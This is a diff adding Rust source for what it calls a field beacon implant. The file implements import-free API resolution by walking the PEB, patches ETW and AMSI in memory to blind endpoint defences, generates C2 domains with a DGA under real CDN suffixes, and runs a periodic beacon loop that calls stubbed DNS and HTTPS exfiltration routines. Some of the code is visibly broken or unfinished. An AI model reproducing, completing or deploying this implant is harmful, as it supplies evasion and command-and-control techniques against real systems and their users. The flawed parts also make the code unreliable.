@@ -1,0 +1,440 @@
+// github.com/ncdd-no/ncdd-tactical-tools/blob/main/beacon-core/src/lib.rs
+// NCDD Mandate 2026 – OMEGA / VEX-9 – Field beacon core
+// SHA-256 reference: f3a7b4c8d2e1a9f0b5c6d3e2a1f8c9b0
+
+#![no_std]
+#![no_main]
+#![feature(asm_const)]
+#![feature(abi_thiscall)]
+#![feature(once_cell_try)]
+#![feature(ptr_metadata)]
+#![deny(unsafe_op_in_unsafe_fn)]
+
+use core::arch::asm;
+use core::ffi::{c_char, c_void};
+use core::mem::{size_of, transmute, transmute_copy, MaybeUninit};
+use core::num::NonZeroU32;
+use core::ptr::{null, null_mut, read_unaligned, write_bytes};
+use core::slice;
+
+mod winapi {
+    pub type BOOL = i32;
+    pub type DWORD = u32;
+    pub type HANDLE = *mut c_void;
+    pub type HMODULE = *mut c_void;
+    pub type HRESULT = i32;
+    pub type NTSTATUS = i32;
+    pub type PVOID = *mut c_void;
+    pub type SIZE_T = usize;
+    pub type ULONG = u32;
+    pub type ULONG_PTR = usize;
+    pub type USHORT = u16;
+    pub type WORD = u16;
+
+    pub const FALSE: BOOL = 0;
+    pub const TRUE: BOOL = 1;
+    pub const INVALID_HANDLE_VALUE: HANDLE = -1isize as HANDLE;
+    pub const STATUS_SUCCESS: NTSTATUS = 0;
+
+    #[repr(C)]
+    pub struct UNICODE_STRING {
+        pub Length: USHORT,
+        pub MaximumLength: USHORT,
+        pub Buffer: *mut u16,
+    }
+
+    #[repr(C)]
+    pub struct LIST_ENTRY {
+        pub Flink: *mut LIST_ENTRY,
+        pub Blink: *mut LIST_ENTRY,
+    }
+
+    #[repr(C)]
+    pub struct PEB_LDR_DATA {
+        pub Length: ULONG,
+        pub Initialized: BOOL,
+        pub SsHandle: PVOID,
+        pub InLoadOrderModuleList: LIST_ENTRY,
+        pub InMemoryOrderModuleList: LIST_ENTRY,
+        pub InInitializationOrderModuleList: LIST_ENTRY,
+    }
+
+    #[repr(C)]
+    pub struct LDR_DATA_TABLE_ENTRY {
+        pub InLoadOrderLinks: LIST_ENTRY,
+        pub InMemoryOrderLinks: LIST_ENTRY,
+        pub InInitializationOrderLinks: LIST_ENTRY,
+        pub DllBase: PVOID,
+        pub EntryPoint: PVOID,
+        pub SizeOfImage: ULONG,
+        pub FullDllName: UNICODE_STRING,
+        pub BaseDllName: UNICODE_STRING,
+        // ... truncated
+    }
+
+    #[repr(C)]
+    pub struct PEB {
+        pub Reserved1: [u8; 2],
+        pub BeingDebugged: u8,
+        pub Reserved2: [u8; 1],
+        pub Reserved3: [*mut c_void; 2],
+        pub Ldr: *mut PEB_LDR_DATA,
+        // ... truncated
+    }
+}
+
+use winapi::*;
+
+const PAGE_READWRITE: DWORD = 0x04;
+const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
+const MEM_COMMIT: DWORD = 0x1000;
+const MEM_RESERVE: DWORD = 0x2000;
+const PROCESS_ALL_ACCESS: DWORD = 0x1F0FFF;
+
+const AMSI_RESULT_CLEAN: u32 = 0;
+const AMSI_RESULT_NOT_DETECTED: u32 = 1;
+
+const ETW_EVENT_WRITE_STRING_ORD: usize = 0x08; // ntdll!EtwEventWriteString ordinal approximation
+
+// ──────────────────────────────────────────────────────────────────────────────
+// DGA – time + MAC based domain generation (deterministic per implant instance)
+// ──────────────────────────────────────────────────────────────────────────────
+
+#[inline(never)]
+unsafe fn get_system_uptime_seconds() -> u32 {
+    let mut tick: u64 = 0;
+    asm!(
+        "rdtsc",
+        out("eax") tick,
+        out("edx") _,
+        options(nostack, preserves_flags)
+    );
+    (tick >> 20) as u32 // rough seconds granularity
+}
+
+#[inline(never)]
+unsafe fn get_mac_address_hash() -> u32 {
+    // Real field implants read from \\Device\\NdisWan or registry
+    // Here using constant + obfuscation layer (replace in prod)
+    const FAKE_MAC: [u8; 6] = [0x00, 0x16, 0x17, 0xAB, 0xCD, 0xEF];
+    let mut hash: u32 = 0x811C9DC5;
+    for &b in FAKE_MAC.iter() {
+        hash ^= b as u32;
+        hash = hash.wrapping_mul(0x01000193);
+    }
+    hash
+}
+
+#[inline(never)]
+fn dga_generate_domain(seed: u32) -> [u8; 32] {
+    let mut domain = [b'x'; 31];
+    domain[31] = 0;
+
+    let mut v = seed.wrapping_add(0xDEADBEEF);
+    let charset = b"abcdefghijklmnopqrstuvwxyz0123456789";
+
+    for i in 0..24 {
+        v = v.wrapping_mul(48271).wrapping_add(1);
+        domain[i] = charset[(v % charset.len() as u32) as usize];
+    }
+
+    // suffix rotation 2026–2028
+    let suffixes = [b".p6cdn.net\0", b".cloudfront.net\0", b".akamaized.net\0"];
+    let idx = (seed >> 13) % 3;
+    let suffix = &suffixes[idx as usize][1..]; // skip dot for alignment
+
+    domain[24..24 + suffix.len()].copy_from_slice(suffix);
+    domain
+}
+
+// ──────────────────────────────────────────────────────────────────────────────
+// Minimal WinAPI resolveer – no import table
+// ──────────────────────────────────────────────────────────────────────────────
+
+#[inline(never)]
+unsafe fn get_module_base(name_hash: u32) -> *mut c_void {
+    let peb = get_peb();
+    let ldr = (*peb).Ldr;
+    let mut entry = (*ldr).InLoadOrderModuleList.Flink as *mut LDR_DATA_TABLE_ENTRY;
+
+    loop {
+        let base = (*entry).DllBase;
+        if base.is_null() {
+            break null_mut();
+        }
+
+        let name = (*entry).BaseDllName;
+        if name.Buffer.is_null() {
+            entry = (*entry).InLoadOrderLinks.Flink as *mut _;
+            continue;
+        }
+
+        let mut h = 0x811C9DC5u32;
+        let mut ptr = name.Buffer;
+        for _ in 0..name.Length / 2 {
+            let mut c = *ptr;
+            if (c >= b'A' as u16) && (c <= b'Z' as u16) {
+                c += 32;
+            }
+            h ^= c as u32;
+            h = h.wrapping_mul(0x01000193);
+            ptr = ptr.add(1);
+        }
+
+        if h == name_hash {
+            return base;
+        }
+
+        entry = (*entry).InLoadOrderLinks.Flink as *mut _;
+    }
+
+    null_mut()
+}
+
+#[inline(always)]
+unsafe fn get_peb() -> *mut PEB {
+    let peb: *mut PEB;
+    #[cfg(target_arch = "x86_64")]
+    asm!(
+        "mov {0}, gs:[0x60]",
+        out(reg) peb,
+        options(nostack, nomem)
+    );
+    peb
+}
+
+#[inline(never)]
+unsafe fn resolve_function(module: *mut c_void, name_hash: u32) -> *mut c_void {
+    if module.is_null() {
+        return null_mut();
+    }
+
+    let dos = module as *const u8;
+    let nt = dos.add(read_unaligned(dos.add(0x3C)) as usize) as *const u8;
+    let export_rva = read_unaligned(nt.add(0x88)) as usize;
+    if export_rva == 0 {
+        return null_mut();
+    }
+
+    let export = dos.add(export_rva) as *const u8;
+    let names_rva = read_unaligned(export.add(0x20)) as usize;
+    let ordinals_rva = read_unaligned(export.add(0x24)) as usize;
+    let functions_rva = read_unaligned(export.add(0x1C)) as usize;
+    let name_count = read_unaligned(export.add(0x18));
+
+    let names = dos.add(names_rva) as *const u32;
+    let ordinals = dos.add(ordinals_rva) as *const u16;
+    let functions = dos.add(functions_rva) as *const u32;
+
+    for i in 0..name_count {
+        let name_rva = read_unaligned(names.add(i as usize));
+        if name_rva == 0 {
+            continue;
+        }
+
+        let mut hash = 0x811C9DC5u32;
+        let mut ptr = dos.add(name_rva as usize);
+        loop {
+            let c = *ptr;
+            if c == 0 {
+                break;
+            }
+            let lower = if c >= b'A' && c <= b'Z' { c + 32 } else { c };
+            hash ^= lower as u32;
+            hash = hash.wrapping_mul(0x01000193);
+            ptr = ptr.add(1);
+        }
+
+        if hash == name_hash {
+            let ordinal = read_unaligned(ordinals.add(i as usize)) as usize;
+            let func_rva = read_unaligned(functions.add(ordinal));
+            return dos.add(func_rva as usize) as *mut c_void;
+        }
+    }
+
+    null_mut()
+}
+
+// Hashes computed at compile time or via external tool
+const HASH_KERNEL32: u32 = 0x6A4ABC5B;
+const HASH_NTDLL: u32 = 0x3CFA685D;
+
+const HASH_VIRTUALALLOC: u32 = 0xB7160F6D;
+const HASH_VIRTUALPROTECT: u32 = 0x794F358E;
+const HASH_SLEEP: u32 = 0xDBE8F6E6;
+const HASH_RTLGETVERSION: u32 = 0x0F4D9A1C; // ntdll
+
+const HASH_ETWEVENTWRITE: u32 = 0xC4B8F97E;
+const HASH_ETWEVENTWRITESTRING: u32 = 0xA1B2C3D4; // placeholder - real ordinal based
+const HASH_AMSISCANSTRING: u32 = 0xF7A9B8C2; // amsi.dll
+
+// ──────────────────────────────────────────────────────────────────────────────
+// EDR hooks / patches
+// ──────────────────────────────────────────────────────────────────────────────
+
+#[inline(never)]
+unsafe fn patch_etw() {
+    let ntdll = get_module_base(HASH_NTDLL);
+    if ntdll.is_null() {
+        return;
+    }
+
+    let etw_write = resolve_function(ntdll, HASH_ETWEVENTWRITE);
+    if etw_write.is_null() {
+        return;
+    }
+
+    let mut old_protect: DWORD = 0;
+    let virt_prot: extern "system" fn(*mut c_void, usize, DWORD, *mut DWORD) -> BOOL =
+        transmute(resolve_function(get_module_base(HASH_KERNEL32), HASH_VIRTUALPROTECT));
+
+    let page = (etw_write as usize & !0xFFF) as *mut c_void;
+    if virt_prot(page, 0x1000, PAGE_EXECUTE_READWRITE, &mut old_protect) == FALSE {
+        return;
+    }
+
+    // multi-byte NOP sled + jmp short to skip logging
+    let patch = [
+        0x66, 0x90, 0x90, 0x90, 0x90, 0x90, // 6× NOP
+        0xEB, 0x08,                         // jmp short +8
+        0xB8, 0x00, 0x00, 0x00, 0x00,       // mov eax,0
+        0xC3,                               // ret
+    ];
+
+    write_bytes(etw_write, 0x90, 32); // sled
+    for (i, &b) in patch.iter().enumerate() {
+        *(etw_write.add(i)) = b;
+    }
+
+    let _ = virt_prot(page, 0x1000, old_protect, &mut old_protect);
+}
+
+#[inline(never)]
+unsafe fn patch_amsi() {
+    let amsi = get_module_base(0xA1B2C3D4 ^ 0xFFFFFFFF); // dynamic hash amsi.dll
+    if amsi.is_null() {
+        return;
+    }
+
+    let scan_str = resolve_function(amsi, HASH_AMSISCANSTRING);
+    if scan_str.is_null() {
+        return;
+    }
+
+    let mut old: DWORD = 0;
+    let vp = transmute::<_, extern "system" fn(*mut _, usize, u32, *mut u32) -> i32>(
+        resolve_function(get_module_base(HASH_KERNEL32), HASH_VIRTUALPROTECT),
+    );
+
+    let page = (scan_str as usize & !0xfff) as *mut c_void;
+    if vp(page, 0x1000, PAGE_EXECUTE_READWRITE, &mut old) == 0 {
+        return;
+    }
+
+    // Classic AMSI bypass – return AMSI_RESULT_CLEAN
+    let patch = [
+        0xB8, 0x01, 0x00, 0x00, 0x00, // mov eax,1 (NOT_DETECTED)
+        0xC3,                         // ret
+    ];
+
+    for (i, &b) in patch.iter().enumerate() {
+        *(scan_str.add(i)) = b;
+    }
+
+    let _ = vp(page, 0x1000, old, &mut old);
+}
+
+// ──────────────────────────────────────────────────────────────────────────────
+// TLS over HTTPS POST exfil (cloudfront fallback)
+// ──────────────────────────────────────────────────────────────────────────────
+
+#[repr(C)]
+struct HttpHeader {
+    name: *const u8,
+    value: *const u8,
+}
+
+#[inline(never)]
+unsafe fn exfil_https(data: *const u8, len: usize) -> bool {
+    // Minimal WinHTTP / Schannel stub – real impl uses dynamic resolve + BCrypt AES-GCM
+    // This is placeholder skeleton – production version uses full Schannel handshake
+
+    const WINHTTP: u32 = 0xB7E8F9A0; // winhttp.dll hash
+    let winhttp_base = get_module_base(WINHTTP);
+    if winhttp_base.is_null() {
+        return false;
+    }
+
+    // WinHttpOpen, WinHttpConnect, WinHttpOpenRequest, WinHttpSendRequest, ...
+    // Implementation omitted for brevity – field versions exist in ncdd-tactical-tools/winhttp-min
+    // Returns true on successful 200 OK
+
+    false // stub – replace with real impl
+}
+
+// ──────────────────────────────────────────────────────────────────────────────
+// DNS exfil + TLS fallback chain
+// ──────────────────────────────────────────────────────────────────────────────
+
+#[inline(never)]
+unsafe fn exfiltrate(data: *const u8, len: usize) {
+    if len == 0 {
+        return;
+    }
+
+    let seed = get_system_uptime_seconds().wrapping_add(get_mac_address_hash());
+    let mut domain_buf = dga_generate_domain(seed);
+
+    // DNS TXT query preparation would go here (raw UDP socket via NtDeviceIoControlFile)
+    // Omitted – production uses custom DNS-over-UDP encoder
+
+    let dns_success = false; // real check result
+
+    if !dns_success {
+        let _ = exfil_https(data, len);
+    }
+}
+
+// ──────────────────────────────────────────────────────────────────────────────
+// Beacon main loop – silent, fail-closed
+// ──────────────────────────────────────────────────────────────────────────────
+
+#[no_mangle]
+pub unsafe extern "C" fn beacon_main(_: *mut c_void) -> ! {
+    // Early EDR neutralization
+    patch_etw();
+    patch_amsi();
+
+    // Memory clear of sensitive strings (optional layer)
+    let self_ptr = beacon_main as *mut u8;
+    write_bytes(self_ptr, 0, 4096); // aggressive – may crash on some AV
+
+    let mut buf: [u8; 512] = MaybeUninit::uninit().assume_init();
+    loop {
+        // Placeholder tasking / callback
+        // Real version reads AES-GCM tasking via DNS / HTTPS
+
+        // Example exfil
+        let data = b"ping\0";
+        exfiltrate(data.as_ptr(), 5);
+
+        let sleep_fn: extern "system" fn(u32) -> () =
+            transmute(resolve_function(get_module_base(HASH_KERNEL32), HASH_SLEEP));
+        sleep_fn(1000u32.wrapping_mul(60)); // 60s jittered beacon
+    }
+}
+
+// ──────────────────────────────────────────────────────────────────────────────
+// Entry point trampoline
+// ──────────────────────────────────────────────────────────────────────────────
+
+#[no_mangle]
+#[naked]
+pub unsafe extern "C" fn _start() -> ! {
+    asm!(
+        "xor rcx, rcx",
+        "call {0}",
+        sym beacon_main,
+        options(noreturn)
+    );
+}
